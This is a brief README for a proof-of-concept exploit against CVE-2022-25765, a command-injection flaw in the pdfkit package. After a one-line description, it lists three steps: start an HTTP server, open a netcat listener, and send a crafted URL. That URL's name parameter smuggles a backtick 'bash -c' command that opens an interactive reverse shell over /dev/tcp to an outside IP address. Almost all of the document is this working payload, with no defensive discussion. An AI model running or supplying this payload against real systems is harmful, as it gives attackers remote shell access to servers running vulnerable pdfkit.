# PDFkit-CMD-Injection 

CVE-2022-25765 Detail

Description
The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.



# PoC

1- python3 -m http.server 80

2- nc -lnvp 'Target Port'

3- http://'TARGET_ADDRESS:Target PORT'//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.16.34/443 <&1'`'}
